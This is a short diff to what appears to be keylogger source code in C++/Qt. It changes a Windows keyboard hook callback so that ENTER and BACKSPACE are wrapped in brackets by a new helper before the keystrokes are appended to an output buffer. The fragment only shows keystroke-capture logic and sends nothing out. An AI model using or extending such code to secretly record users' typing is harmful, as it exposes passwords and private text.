@@ -108,7 +108,8 @@ LRESULT CALLBACK Core::process(int nCode, WPARAM wParam, LPARAM lParam)
             QString keyString = QString::fromUtf16((ushort *) lpszName);
 
             if (keyString == "ENTER") {
-                toBeAppended = "\n[" + keyString + "]\n";
+                wrapActionKey(keyString);
+                toBeAppended = keyString;
             } else if (keyString == "BACKSPACE" && !outputBuffer.isEmpty()) {
                 int toChop = 1;
 
@@ -130,6 +131,9 @@ LRESULT CALLBACK Core::process(int nCode, WPARAM wParam, LPARAM lParam)
                 }
 
                 outputBuffer.chop(toChop);
+            } else if (keyString == "BACKSPACE" && outputBuffer.isEmpty()) {
+                wrapActionKey(keyString);
+                toBeAppended = keyString;
             } else {
                 toBeAppended = QString::fromUtf16((ushort *) buffer);
             }
@@ -152,3 +156,9 @@ void Core::writeOutput()
         outputBuffer.clear();
     }
 }
+
+void Core::wrapActionKey(QString &actionKey)
+{
+    actionKey = "[" + actionKey + "]\n";
+}
+
